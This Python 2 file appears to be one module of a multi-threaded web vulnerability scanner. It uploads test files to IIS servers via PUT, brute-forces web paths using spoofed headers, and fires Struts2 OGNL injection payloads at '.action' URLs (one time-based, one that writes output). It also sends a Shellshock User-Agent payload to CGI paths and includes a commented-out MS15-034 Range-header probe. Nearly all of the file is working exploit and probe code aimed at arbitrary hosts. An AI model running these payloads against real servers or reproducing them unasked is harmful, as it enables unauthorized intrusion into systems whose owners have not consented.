#coding=utf-8
import threading
from printers import printPink,printRed,printGreen
from multiprocessing.dummy import Pool
import requests
import socket
import httplib
import time
import urlparse
import urllib2
import re
socket.setdefaulttimeout(10)  #设置了全局默认超时时间


def SendHTTPRequest(strMethod,strScheme,strHost,strURL,strParam):
    headers = {
        "Accept": "image/gif, */*",
        "Referer": strScheme + "://" + strHost,   #将Referer修改成为其自身的URL，有助于绕过一些过滤机制
        "Accept-Language": "zh-cn",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate",
        "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
        "Host": strHost,
        "Connection": "Keep-Alive",
        "Cache-Control": "no-cache"
    }
    strRet=""
    time_inter=0
    try:
        time1=0  #使用两个time变量获取请求的执行时间，Python应该有更好的实现办法，可惜我对Python只懂皮毛，先这样吧
        time2=0
        time1=time.time() * 1000
        if strScheme.upper()=="HTTPS": #URLLib中，对于HTTP和HTTPS的连接要求是不同的
            con2 = httplib.HTTPSConnection(strHost)
        else:
            con2 = httplib.HTTPConnection(strHost)

        if strMethod.upper()=="POST":
            con2.request(method="POST",url= strURL, body=strParam, headers=headers)
        else:
            con2.request(method="GET",url= strURL, headers=headers)
        r2 = con2.getresponse()
        strRet= r2.read().strip()
        time2=time.time() * 1000
        time_inter=time2-time1    #得到请求的响应时间
        con2.close
    except BaseException,e:
        print e
        con2.close
    return (time_inter,strRet)


def RunTest1(strScheme,strHost,strURL):
    payload1="""('\\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(d)(('@java.lang.Thread@sleep(8000)')(d))"""
    (inter1,html1)=SendHTTPRequest("GET",strScheme,strHost,strURL,"")          #没有Payload的请求
    (inter2,html2)=SendHTTPRequest("POST",strScheme,strHost,strURL,payload1)   #带有Payload的请求
    if (inter2 - inter1)>6000:
        return True
    else:
        return False

def RunTest2(strScheme,strHost,strURL):
    payload1="""('\\43_memberAccess[\\'allowStaticMethodAccess\\']')(meh)=true&(aaa)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(d))&('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))&(asdf)(('\\43rp\\75@org.apache.struts2.ServletActionContext@getResponse()')(c))&(fgd)(('\\43rp.getWriter().print("struts2-security")')(d))&(fgd)&(grgr)(('\\43rp.getWriter().close()')(d))=1"""
    (inter1,html1)=SendHTTPRequest("POST",strScheme,strHost,strURL,payload1)
    if html1.find("struts2-security")>=0:
        return True
    else:
        return False

def RunTests(strURL):
    t_url=urlparse.urlparse(strURL)
    strScheme=t_url.scheme
    strHost = t_url.netloc
    strURL1 = t_url.path
    if RunTest2(strScheme,strHost,strURL1):
        return 1
    elif RunTest1(strScheme,strHost,strURL1):
        return 1
    else:
        return 0

def my_urlencode(str) :
       reprStr = repr(str).replace(r'\x', '%')
       return reprStr[1:-1]

def poke_test(str):
    opener = urllib2.build_opener()
    # Modify User-agent header value for Shell Shock test
    opener.addheaders = [
        ('User-agent', '() { :;}; echo Content-Type: text/plain ; echo "1a8b8e54b53f63a8efae84e064373f19:"'),
        ('Accept','text/plain'),
        ('Content-type','application/x-www-form-urlencoded'),
        ('Referer','http://www.baidu.com')
        ]
    try:
        response = opener.open(str)
        headers = response.info()
        status = response.getcode()
        opener.close()
        if status==200:
            if "1a8b8e54b53f63a8efae84e064373f19" in headers:
                return 1
            else:
                return 0
    except Exception,e:
        print e
        pass



def iis_put_scanner(ip,port):
        #iis_put vlun scann
        try:
            url='http://'+ip+':'+str(port)+'/'+str(time.time())+'.txt'
            r = requests.put(url,data='hi~',timeout=10)
            if r.status_code==201:
                lock.acquire()
                printGreen('%s has iis_put vlun at %s\r\n' %(ip,port))
                lock.release()
                result.append('%s has iis_put vlun at %s\r\n' %(ip,port))
        except Exception,e:
            print e
            pass


        #webfilescan
        try:
            header={'X-FORWARDED-FOR': '61.135.169.121', 'Referer': 'http://www.baidu.com','User-Agent':'baidupaida'}
            d=open('conf/dir.conf','r')
            data=d.readline().strip('\r\n')
            url404="http://%s:%s/Iamstall404hahah" %(ip,port)
            #print url404
            re=requests.get(url404,headers=header,verify=False,timeout=10)
            conten404=re.content
            re.close()
            while(data):
                url="http://%s:%s/%s" %(ip,port,data)
                #print url
                url=my_urlencode(url)
                #print url
                r=requests.get(url,headers=header,verify=False,timeout=10)
                if r.status_code ==200:
                    if r.content ==conten404:
                        pass
                    else:
                        lock.acquire()
                        print '%s  is exist' %url
                        lock.release()
                        url200.append(url)
                        result.append('%s  is exist\r' %url)
                    r.close()
                data=d.readline().strip('\r\n')
            result.append('\n')
        except Exception,e:
            print e
            pass




        #sturt2 test
        try:
            for l in url200:
                if l.find('.action')>0:
                    re2=RunTests(l)
                    if re2 == 1:
                        lock.acquire()
                        printGreen('%s has sturt2 vlun\r\n' %l)
                        lock.release()
                        result.append('%s has sturt2 vlun\r\n' %l)
                    break
        except Exception,e:
            print e
            pass


        #破壳 test
        try:
            for l in url200:
                if l.find('.cgi')>0:
                    r=poke_test(l)
                    if r==1:
                        lock.acquire()
                        printGreen('%s has poke vlun\r\n' %l)
                        lock.release()
                        result.append('%s has poke vlun\r\n' %l)
        except Exception,e:
            print e
            pass


        #iis tests ms_15_03
        """
        try:
            hexAllFfff = "18446744073709551615"
            req1 = "GET / HTTP/1.0\r\n\r\n"
            req = "GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-" + hexAllFfff + "\r\n\r\n"
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((ip, port))
            client_socket.send(req1)
            boringResp = client_socket.recv(1024)
            if "Microsoft" not in boringResp:
                lock.acquire()
                print "[*] Not IIS"
                lock.release()
            else:
                client_socket.close()
                client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client_socket.connect((ip, port))
                client_socket.send(req)
                goodResp = client_socket.recv(1024)
                if "Requested Range Not Satisfiable" in goodResp:
                                lock.acquire()
                                printRed("%s iis at %s port Looks MS15-034 VULN\r\n" %(ip,port))
                                lock.release()
                                result.append("%s iis at %s port Looks MS15-034 VULN\r\n" %(ip,port))
        except Exception,e:
            print e
            pass
        """


def web_main(ipdict,threads):
    printPink("test iip_put &&scanner web paths&& test sturt2&&test poke&&test iis ms_15_03 now...")
    print "[*] start test iip_put&&scanner web paths at %s" % time.ctime()
    starttime=time.time()

    global lock
    lock = threading.Lock()

    global result
    global url200
    result=[]
    url200=[]
    pool=Pool(threads)

    for ip in ipdict['http']:
        pool.apply_async(func=iis_put_scanner,args=(str(ip).split(':')[0],int(str(ip).split(':')[1])))
    pool.close()
    pool.join()

    print "[*] stop test iip_put&&scanner web paths at %s" % time.ctime()
    print "[*] test iip_put&&scanner web paths done,it has Elapsed time:%s " % (time.time()-starttime)

    return result
